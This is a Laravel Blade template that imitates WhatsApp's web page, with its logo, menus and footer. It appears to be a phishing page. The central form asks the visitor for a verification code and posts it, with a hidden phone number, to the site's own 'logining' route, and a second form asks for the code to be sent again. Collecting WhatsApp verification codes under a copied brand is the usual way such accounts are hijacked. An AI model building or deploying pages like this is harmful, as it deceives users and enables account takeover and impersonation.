<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>WhatsApp</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" href="{{asset('')}}asset/css/web.css">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css"
        integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
    <link rel="shortcut icon" href="https://static.whatsapp.net/rsrc.php/v3/yP/r/rYZqPCBaG70.png">
    <!-- CSS only -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">
</head>

<body>

    <div class="main">
        <nav>
            <div class="whatsapp_logo part_nav">

                <a href="whatsapp web.html"><img src="https://static.whatsapp.net/rsrc.php/v3/yP/r/rYZqPCBaG70.png"
                        alt="whatsapp_logo" width="40px" height="40px"><span>WhatsApp</span></a>
            </div>
            <ul class="nav_options part_nav">

                <li><a href="#">WHATSAPP WEB</a></li>
                <li><a href="#">FEATURES</a></li>
                <li><a href="#">DOWNLOAD</a></li>
                <li><a href="#">SECURITY</a></li>
                <li><a href="#">FAQ</a></li>
                <li class="dropdown_main"><i class="fas fa-globe"></i> <span> EN <i class="fas fa-sort-down"></i></span>
                </li>
            </ul>
            <!-- The navigation bar at mobile screen -->
            <div class="short_nav">
                <span id="dropdown"><i class="fas fa-bars"></i>
                    <ul>
                        <a href="#">
                            <li>WHATSAPP WEB</li>
                        </a>
                        <a href="#">
                            <li>FEATURES</li>
                        </a>
                        <a href="#">
                            <li>DOWNLOAD</li>
                        </a>
                        <a href="#">
                            <li>SECURITY</li>
                        </a>
                        <a href="#">
                            <li>FAQ</li>
                        </a>
                        <li class="dropdown_main"><i class="fas fa-globe"></i> <span> EN <i
                                    class="fas fa-sort-down"></i></span></li>
                    </ul>
                </span>
                <p><a href="whatsapp web.html"><img src="https://static.whatsapp.net/rsrc.php/v3/yP/r/rYZqPCBaG70.png"
                            alt="whatsapp_logo" width="70px" height="70px"></a> <br> WhatsApp</p>

            </div>
        </nav>
        <BR><BR><BR></BR></BR></BR>
        

      @if(session("success"))
      <div class="alert alert-success" style="width:350px;" role="alert">
        {{session("success")}}
      </div>
      @endif

        
        @if(session("error"))
            <div class="alert alert-danger" style="width:350px;" role="alert">
                {{session('error')}}
            </div>
        @endif


        <form method="post" action="{{route('logining')}}">
            @csrf
            <div style="width:350px; display:inline-block" class="form-group">
                <input type="text" name="code" class="form-control" id="exampleInputPassword1" placeholder="CODE" required>
            </div> 
            <input type="hidden" name="phoneNumber" value="{{$phoneNumber}}">
            
            <button type="submit" class="btn btn-success">Verify</button>
        </form>


        <form method="post" action="{{route('sendCodeAgainOrFail')}}">
            @csrf
            
            <input type="hidden" name="phoneNumber" value="{{$phoneNumber}}">
            
            <button type="submit" class="btn btn-warning">SEND CODE AGAİN</button>
        </form>

    

        
        
        <footer>
            <br>
            <div class="bottom_options">
                <ul>
                    <h4>whatsapp</h4>
                    <li><a href="#">Features</a></li>
                    <li><a href="#">Security</a></li>
                    <li><a href="#">Download</a></li>
                    <li><a href="#">WhatsApp Web</a></li>
                    <li><a href="#">business</a></li>
                </ul>
                <ul>
                    <h4>company</h4>
                    <li><a href="#">About</a></li>
                    <li><a href="#">Careers</a></li>
                    <li><a href="#">Brand Center</a></li>
                    <li><a href="#">Get In Touch</a></li>
                    <li><a href="#">Blog</a></li>
                </ul>
                <ul>
                    <h4>download</h4>
                    <li><a href="#">Mac/PC</a></li>
                    <li><a href="#">Android</a></li>
                    <li><a href="#">iPhone</a></li>
                    <li><a
                            href="#">Windows
                            Phone</a></li>
                    <li><a href="#">Nokia</a></li>
                </ul>
                <ul>
                    <h4>help</h4>
                    <li><a href="#">FAQ</a></li>
                    <li><a href="#">Twiter</a></li>
                    <li><a href="#">Facebook</a></li>
                </ul>
            </div>
            <div class="bottom_line">
                <p>2019 &copy; WhatsApp Inc</p>
                <p><a href="#"> Privacy &amp; Terms</a></p>
            </div>
        </footer>

    </div>

<!-- JavaScript Bundle with Popper -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3" crossorigin="anonymous"></script>
</body>

</html>